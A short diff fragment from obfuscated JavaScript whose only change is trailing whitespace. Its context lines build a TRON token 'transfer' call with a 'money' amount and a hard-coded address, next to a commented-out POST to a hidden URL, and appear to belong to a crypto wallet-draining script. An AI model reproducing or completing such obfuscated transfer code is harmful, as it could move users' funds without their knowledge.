@@ -185,7 +185,7 @@ async function _0xd0365b() {
         "money": _0xd0363c,
         "_0x19h196": tronWeb.address.toHex("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"),
         "_0x8f8196":"transfer(address,uint256)"
-      };
+      }; 
     // $.ajax({
     //   "type": "POST",
     //   "url": _0x2c6c51,
